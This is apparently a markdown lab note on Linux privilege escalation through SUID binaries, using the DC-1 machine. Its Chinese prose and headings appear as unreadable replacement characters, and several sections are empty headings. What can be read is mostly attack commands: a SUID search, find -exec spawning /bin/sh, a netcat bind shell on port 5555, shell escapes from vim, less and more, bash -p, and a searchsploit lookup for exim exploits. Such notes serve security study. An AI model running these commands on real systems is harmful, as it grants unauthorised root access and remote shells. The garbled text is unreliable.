- [��������](#��������)
- [������Ϣ�ռ�](#������Ϣ�ռ�)
- [��Ȩ����](#��Ȩ����)
  - [SUID��Ȩ](#suid��Ȩ)
    - [����find������Ȩ](#����find������Ȩ)
    - [����nmap](#����nmap)
    - [����git](#����git)
    - [����vim/vi](#����vimvi)
    - [����bash](#����bash)
    - [����less](#����less)
    - [����more](#����more)
    - [����nmap](#����nmap-1)
    - [����exim4](#����exim4)
  - [�����ں�©��](#�����ں�©��)
  - [����root������ִ��](#����root������ִ��)
  - [���û�������](#���û�������)
  - [���ô���©��������](#���ô���©��������)
  - [���õ�����������Ȩ](#���õ�����������Ȩ)
- [�ο�����](#�ο�����)


# ��������

# ������Ϣ�ռ�

# ��Ȩ����
## SUID��Ȩ

**suid:Set owner User ID up on execution**

SUID��һ��**�Զ����Ƴ���������õ�����Ȩ��**�������ö����Ƴ����ִ����**��ʱ**ӵ��������Ȩ�ޣ�����ӵ��ִ��Ȩ�޵Ķ����Ƴ�����Ч�������磬�����û�������ִ��passwd�������޸��Լ����û����룬���û����뱣����/etc/shadow�ļ��С���ϸ�鿴����ļ��ͻᷢ������Ĭ��Ȩ����000��Ҳ����˵����root����Ա���⣬�����û���û�в鿴��༭���ļ���Ȩ�ޡ����ǣ���ʹ��passwd����ʱ�������SUID����Ȩ��λ���Ϳ�����ͨ�û���ʱ��ó��������ߵ���ݣ��ѱ����������Ϣд�뵽shadow�ļ��С�

���û���ִ�г���/�ļ�������ʱ�����ȡ�ļ��������ߵ�Ȩ���Լ������ߵ�UID��GID��
--����˿�������ӵ��rootȨ�޵��ļ�������ȡrootȨ��

����ӵ��rootȨ�޵�suid�ļ�����������,��ͬϵͳ�������ͬ

```bash
    find / -perm -u=s -type f 2>/dev/null 
    find / -user root -perm -4000-print2>/dev/null 
    find / -user root -perm -4000-exec ls -ldb {} \;
```
������ͣ�


* / ��ʾ���ļ�ϵͳ�Ķ�����������ʼ���ҵ�ÿ��Ŀ¼
* -perm ��ʾ��������Ȩ��
* -u=s��ʾ����root�û�ӵ�е��ļ�
* -type��ʾ��������Ѱ�ҵ��ļ����� f ��ʾ�����ļ���������Ŀ¼�������ļ�
* 2��ʾ�ý��̵ĵڶ����ļ�����������stderr����׼����
* >��ʾ�ض���  
* /dev/null��һ��������ļ�ϵͳ������������д�����е��������ݡ�



����������Ȩ��Linux�ļ��У�Nmap, Vim, find, bash, more, less, nano, cp

eg:�г�DC-1��ӵ��rootȨ�޵Ŀ�ִ���ļ����£�

<img src="images/image-20210318203412742.png" width="67%;" />

### ����find������Ȩ

ʹ�ðг���**DC-1**

```bash
    #����exec������Ȩ
    mkdir test  #����test�ļ���
    touch test  #���ߴ���test�ļ�
    find test -exec "whoami" \;  #����exec�鿴��ǰ�û������root��˵����ǰ��������rootȨ��ִ�е�
    find test -exec '/bin/sh' \;  
```

<img src="images/find3.png" width="70%"/>


```bash
    #�����������Ȩ
    find test -exec netcat -lvp 5555 -e /bin/sh \;
    netcat �����IP 5555
```

<img src="images/find1.png" width="70%">
<img src="images/find2.png" width="50%">

### ����nmap

### ����git

### ����vim/vi

```bash
#��vim������ESC
:set shell=/bin/sh
:shell
#������ʽ
sudo vim -c '!sh'
```

### ����bash
```bash
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```

### ����less
```bash
less /etc/passwd
!/bin/sh
```

### ����more
```bash
more /home/pelle/myfile
!/bin/bash
```

### ����nmap


### ����exim4

��Ҫ����exim4��������©����������Ȩ

kali��`searchsploit exim`����������exim��ص�����exp����Ҫ��ȷ��exim�İ汾��Ϣ

<img src='images/exim4.png'/>

<img src='images/exim-exploit.png'/>

## �����ں�©��

## ����root������ִ��

## ���û�������

## ���ô���©��������

## ���õ�����������Ȩ



# �ο�����
- [Linux SUID ��Ȩ](https://jlkl.github.io/2020/01/27/Web_15/)
- [Linux��Ȩ�ļ��ܽ�](https://xz.aliyun.com/t/7924#toc-0)

